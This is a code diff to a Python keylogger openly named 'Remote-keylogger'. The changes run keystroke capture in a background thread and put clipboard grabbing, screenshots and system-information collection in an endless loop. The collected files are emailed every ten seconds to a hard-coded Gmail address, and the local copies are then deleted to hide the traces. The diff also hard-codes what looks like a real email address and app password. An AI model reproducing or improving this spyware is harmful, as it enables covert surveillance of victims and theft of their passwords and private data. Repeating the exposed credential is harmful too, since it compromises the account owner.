@@ -11,6 +11,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import threading
 
 # File paths
 keys_information = "key_log.txt"
@@ -19,9 +20,9 @@ clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 
 # Email configuration
-email_address = " " # This email address is the one that will send the email
-password = " " # Password of the email address
-toaddr = " " # This email address is the one that will receive the email
+email_address = "gmb.gian@gmail.com"  # This email address is the one that will send the email
+password = "qzuy hext mgaj katx"  # Password of the email address
+toaddr = "gmb.gian@gmail.com"  # This email address is the one that will receive the email
 
 # File storage path
 file_path = "C:\\Users\\Admin\\Desktop\\Remote-keylogger"
@@ -94,17 +95,27 @@ def on_release(key):
     if key == Key.esc:
         return False
 
-# Main execution
-if __name__ == "__main__":
-    computer_information()
-    copy_clipboard()
-    screenshot()
-
+def start_keylogger():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    time.sleep(120)
+# Main execution loop
+if __name__ == "__main__":
+   # Start the keylogger in a separate thread
+    listener_thread = threading.Thread(target=start_keylogger)
+    listener_thread.start()
 
-    for file in [keys_information, system_information, clipboard_information, screenshot_information]:
-        send_email(file, file_merge + file, toaddr)
-        os.remove(file_merge + file)
+    # Run the rest of the functions in the main thread
+    while True:
+        # Step 1: Collect system info, clipboard content, and take screenshot
+        computer_information()
+        copy_clipboard()
+        screenshot()
+
+        # Step 2: Send collected files via email
+        for file in [keys_information, system_information, clipboard_information, screenshot_information]:
+            send_email(file, file_merge + file, toaddr)
+            os.remove(file_merge + file)
+
+        # Step 3: Wait before next iteration (adjust the time interval as necessary)
+        time.sleep(10)  # Adjust the time interval for the next cycle
